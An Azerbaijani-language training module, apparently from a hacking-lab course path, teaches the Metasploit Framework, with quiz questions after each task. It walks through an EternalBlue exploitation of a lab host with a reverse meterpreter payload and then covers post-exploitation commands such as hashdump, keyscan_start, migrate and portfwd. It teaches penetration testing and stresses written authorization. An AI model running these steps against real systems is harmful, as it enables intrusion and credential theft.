# Room: Metasploit Framework Əsasları

**Path:** Network & Infrastructure Security
**Module:** Network Exploitation
**Çətinlik:** Intermediate
**Təxmini vaxt:** 2 saat

## Room haqqında

Metasploit Framework — dünyanın ən məşhur exploitation platformasıdır: minlərlə hazır modul, payload generator-u və bütün istismar axınını bir konsolda birləşdirir. Bu room-da Metasploit-in strukturu (exploit/payload/auxiliary), msfconsole-un əsas komandaları və search → use → set → run axınını konseptual səviyyədə öyrənəcəksiniz. Məqsəd aləti əzbərləmək yox, onun məntiqini başa düşməkdir.

## Öyrənmə nəticələri

- Metasploit-in strukturunu (exploit, payload, auxiliary, post modulları) izah etmək
- msfconsole-un əsas komandaları ilə işləmək
- Search → use → set → exploit/run axınını tətbiq etmək
- Meterpreter-in nə olduğunu və niyə güclü olduğunu bilmək

## Task 1 — Struktur: Modulların Dünyası

Metasploit-in mərkəzi anlayışı — **modul**. Hər modul konkret vəzifə daşıyır:

| Modul növü | Vəzifə | Nümunə |
|---|---|---|
| **Exploit** | Zəifliyi istismar edib kod icrasına çatmaq | `exploit/windows/smb/ms17_010_eternalblue` |
| **Payload** | İstismardan sonra nə icra olunacaq | `windows/x64/meterpreter/reverse_tcp` |
| **Auxiliary** | Skan, enum, fuzz — istismar etməyən modullar | `auxiliary/scanner/ftp/ftp_version` |
| **Post** | İstismardan sonra: enum, privesc, data toplama | `post/windows/gather/hashdump` |
| **Encoder** | Payload-ın "şəklini dəyişmək" (AV-dən yayınma) | `x86/shikata_ga_nai` |
| **NOP** | Payload sabitlənməsi (buffer overflow dünyası) | `x86/opty2` |

Exploit və payload ayrılığı — Metasploit-in dizayn fəlsəfəsidir: **"qapı açan" (exploit) və "içəri girən" (payload) müstəqil seçilir.** Eyni EternalBlue exploit-i ilə meterpreter payload-u, sadə shell payload-u və ya sadəcə məlumat toplayan payload göndərmək olar.

Payload növləri:

- **Singles (inline):** tam fərqli şəkildə gedən kiçik payload-lar.
- **Stagers:** əvvəlcə kiçik "bağlantı quran" hissə gedir, sonra...
- **Stages:** ...əsas payload (məs. Meterpreter) həmin bağlantıdan yüklənir. `reverse_tcp` — hədəf bizə qoşulur (ən çox istifadə); `bind_tcp` — hədəfdə port açılır, biz qoşuluruq.

Meterpreter — Metasploit-in "tac payload-u": memory-da işləyən (disk-ə yazılmayan), şifrələnmiş kommunikasiyalı, zəngin funksiyalı agent. Sadə shell-dən fərqi: fayl sisteminə toxunmur (aşkarlanma az), əmrlər Metasploit API-si ilə gedir (`hashdump`, `screenshot`, `migrate` kimi yüksək səviyyəli əmrlər mövcuddur).

**Sual 1**
Exploit və payload arasındakı məntiqi ayrılığı izah edin.

**Sual 2.**
Stager/stage mexanizmi necə işləyir?

**Sual 3.**
Meterpreter sadə shell-dən nə ilə fərqlənir?

## Task 2 — msfconsole: İş Masası

`msfconsole` — Metasploit-in interaktiv konsolu (Kali-də ön-qurğu­lu). Əsas komandalar qruplarla:

**Naviqasiya və axtarış:**

```
msf6> search eternalblue
msf6> search type:auxiliary ftp
msf6> info exploit/windows/smb/ms17_010_eternalblue
```

`search` — modulu tapmağın əsas yolu (ad, CVE, platforma, tip üzrə). `info` — modulun təsviri, referansları (CVE link-ləri), opsiyaları.

**Modul seçimi və konfiqurasiya:**

```
msf6> use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(...)> show options
msf6 exploit(...)> set RHOSTS 10.10.10.5
msf6 exploit(...)> set LHOST 10.10.14.1
msf6 exploit(...)> set PAYLOAD windows/x64/meterpreter/reverse_tcp
```

`show options` — modulun istədiyi parametrlər: RHOSTS (hədəf ünvan(lar)ı — çoxlu skanlarda şəbəkə dəsti olur), LHOST (bizim IP — reverse payload üçün), LPORT, SMBUser və s. `set`/`unset`, `setg` (qlobal set — sessiya boyu).

**İcra:**

```
msf6 exploit(...)> exploit        # və ya run
msf6 exploit(...)> exploit -j     # arxa fonda (job)
```

**Session idarəetməsi (uğurdan sonra):**

```
meterpreter> sessions -l          # aktiv sessiyalar
meterpreter> sessions -i 1        # 1 nömrəliyə keç
meterpreter> background           # sessiyanı arxaya at
```

**Kömək:** `help`, `?` — hər kontekstdə mövcud komandaları göstərir.

Mühim vərdiş: `show options`-ı hər modul dəyişəndə oxumaq. Hər modulun öz tələbləri var; RHOSTS/LHOST ən standartlarıdır, amma bəziləri əlavə sahələr (yol, istifadəçi, fuzz dəyəri...) tələb edir. Console hər `exploit`-dən əvvəl boş qalan required parametrləri xəbərdarlıq edir — amma oxumaq yaxşı vərdişdir.

msfconsole-dan kənarda köməkçi alətlər: `msfvenom` (payload generasiyası — standalone exploit-lər üçün), `msfdb` (lokal database — workspace-lər, tapıntı qeydləri). Onlar haqqında post-exploitation module-larında daha çox.

**Sual 1**
`search`-in istifadə üsullarından üçünü göstərin.

**Sual 2.**
RHOSTS və LHOST nədir — hər biri kim tərəfdən təyin olunur?

**Sual 3.**
`sessions` komandaları nə üçün lazımdır?

## Task 3 — Tam Axın: Search → Use → Set → Run

İndi bütün axını bir ssenaridə birləşdirək. Şərait: lab hədəfi 10.10.10.5, enum-dan məlumdur — Windows, SMB açıq, SMBv1 (MS17-010 şübhəsi).

**Addım 1 — Aşkarlama (auxiliary):**

```
msf6> use auxiliary/scanner/smb/smb_ms17_010
msf6> set RHOSTS 10.10.10.5
msf6> run
[+] 10.10.10.5:445   - Host is likely VULNERABLE to MS17-010!
```

Auxiliary skaneri zəifliyi "ehtimal" kimi təsdiqlədi — hələ istismar yoxdu.

**Addım 2 — Exploit seçimi:**

```
msf6> search eternalblue
msf6> use 0        # siyahıdan birbaşa nömrə ilə seçim
```

**Addım 3 — Konfiqurasiya:**

```
msf6> set RHOSTS 10.10.10.5
msf6> set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6> set LHOST 10.10.14.1       # tun0 IP (VPN interfeysi)
msf6> show options                 # yoxlama
```

**Addım 4 — İcra:**

```
msf6> exploit
[*] Started reverse TCP handler on 10.10.14.1:4444
[+] 10.10.10.5:445 - ...
meterpreter> getuid
SERVER authority\SYSTEM
```

`getuid` — kimlik: SYSTEM = Windows-da ən yüksək səviyyə. İstismar uğurlu tamamlandı.

**Addım 5 — Post-exploitation (giriş):**

```
meterpreter> sysinfo
meterpreter> hashdump            # SAM hash-ləri
meterpreter> shell               # sadə cmd-ə düş
```

Bu axının özəyi — **hər addım əvvəlkinin nəticəsidir**: enum (SMBv1) → auxiliary təsdiqi → exploit seçimi → konfiqurasiya → icra → post. Metasploit axını "sehrli exploit düyməsi" deyil; o, əllə ayaqları sürətləndirir, amma "hansı qapı, hansı açar" sualına enum cavab verir.

Lab şəraitində bu axını təkrarlamaq üçün: Metasploitable 2/3, TryHackMe/HTB Windows maşınları. Hər modulun `info` səhifəsində referanslar (CVE, vendor advisory) oxumaq dərsin parçasıdır: exploit-in nə etdiyini anlamadan işə salmamaq — peşəkar qayda.

**Sual 1**
Axında auxiliary skanerin rolu nədir?

**Sual 2.**
LHOST kimi hansı ünvan təyin edilir və niyə?

**Sual 3.**
Uğurlu istismardan sonra ilk yoxlanan nədir?

## Task 4 — Meterpreter: Post-Exploitation Pəncərəsi

Meterpreter kontekstində əsas komandalar (qruplarla):

**Kimlik və sistem:**

```
getuid        # kimik
sysinfo       # OS, arxitektura
ps            # proses siyahısı
```

**Fayl sistemi:**

```
ls / cd / cat / download / upload
```

**Şəbəkə:**

```
ifconfig / route / portfwd        # port yönləndirmə (pivoting)
```

**İmtiyaz və hərəkət:**

```
getsystem      # privesc cəhdi (köhnə Windows-larda)
hashdump       # parol hash-ləri
migrate PID    # başqa prosesə keç (stabilitlik/gizlilik)
```

**Ekran/GUI:** `screenshot`, `keyscan_start` (keylogger).

**Ayrılma:** `exit` (sessiyanı öldürür), `background` (saxlayır).

`migrate`-in izahı: Meterpreter açılan prosesdə (məs. exploit edilən servisdə) işə düşür — servis yenidən başlayanda sessiya ölür. `migrate` ilə stabil prosesə (məs. explorer.exe) keçid sessiyanı qoruyur. Bu, "session davamlılığı"nın ilk dərsidir — post-exploitation module-u bu mövzunu dərinləşdirəcək.

`portfwd` — pivoting-in ilk addımı: hədəfin daxili şəbəkəsinə çatmaq üçün port tuneli. Məsələn, hədəfin daxilindəki 10.10.10.100:3389-a bizim 4445 portundan yönləndirmə — RDP-yə "hədəfin gözündən" qoşulma. Şəbəkə pivot-ları advanced mövzu, amma konsept burada qoyulur: **ələ keçirilmiş sistem = daxili şəbəkəyə körpü.**

Meterpreter-in aşkarlanma müqaviləsi: proseslərdə tanınması mümkündür (memory scan, behavioral AV); "əmin ilk addım" — mövcud DCM/EDR yoxlamasıdır (`run post/windows/manage/killav` kimi aqressiv modullar ROE ilə məhdudlaşır — real sistemdə məlumat toplama qabağa keçir). Evasion ayrıca module-dur (7.3); burada yalnız qeyd: Metasploit "səs-küylü" alətdir, stealth tələb edən ssenarilərdə (red team) xüsusi alətlər üstünlük təşkil edir.

**Sual 1**
`migrate` nə üçün istifadə olunur?

**Sual 2.**
`portfwd` hansı imkanı verir — konseptual izah?

**Sual 3.**
Meterpreter-in "aşkarlanma" problemi nədən doğur?

## Task 5 — Metasploit-in Yeri: Niyə, Nə Vaxt, Nə Qədər

Peşəkar baxış — Metasploit-in güc və zəif tərəflərinin düzgün qiymətləndirilməsi:

**Güclü tərəfləri:**

- Sürət: hazır modullar + vahid interfeys = eksperiment dövrü qısılır.
- Əhatə: minlərlə modul (exploit/auxiliary/post) — enum-dan data toplamaya qədər tam dəst.
- Meterpreter: güclü post-exploitation agent.
- Təhsil dəyəri: hər modul referansları (CVE) ilə — zəifliyin özünü öyrənmək üçün living ensiklopediya.
- Qeyd: `notes`, `vulns`, `services` — workspace-də tapıntı saxlama (MSF DB ilə).

**Zəif/məhdud tərəfləri:**

- Aşkarlanma: NDR/AV sistemləri üçün tanınan trafik/davranış (ənənəvi MSF pattern-ləri).
- "Kütlə" aləti: custom zəifliklər, business logic, yeni 0-day-lar MSF-də olmur — exploit development ayrıca sənətdir.
- Stabilitlik: bəzi exploit-lər hədəfi çıxarırlar (crash) — production sistemdə risk.
- Məqsəd izi: log-larda aydın iz buraxır (pentest-də qəbul oluna bilər, red team-da yox).

**Nə vaxt hansı:** pentest-də — MSF mərkəzi alətlərdən biri (xüsusən başlanğıc/orta mərhələ); CTF-lab-da — ideal öyrənmə mühiti; stealth red team-da — seçici (auxiliary/post çox, exploit-lər az); exploit development-da — PoC bazası kimi, amma custom iş öz kod deməkdir.

**Etik çərçivə (təkrar, amma kritik):** MSF yalnız yazılı icazəli hədəflərdə; `exploit -j` və mass RHOSTS şəbəkə skanları yalnız razılaşdırılmış range-də; hər istismarın crash riski başlanğıcda müzakirə olunmalıdır.

Bu room Path-4-ün exploitation yarısını bağlayır. Növbəti module — Vulnerability Assessment — zəifliyin exploit-dən əvvəlki mərhələsini (sistemli skan, CVSS, manual doğrulama) öyrədəcək: Metasploit "girəndən sonra" alətidir, VA isə "hansı qapıya girməliyik" sualına cavab verir.

**Sual 1**
Metasploit-in üç güclü tərəfini sadalayın.

**Sual 2.**
Metasploit-in məhdudiyyətləri hansılardır?

**Sual 3.**
"MSF girəndən sonrakı alətdir, VA əvvəlki" ifadəsini izah edin.
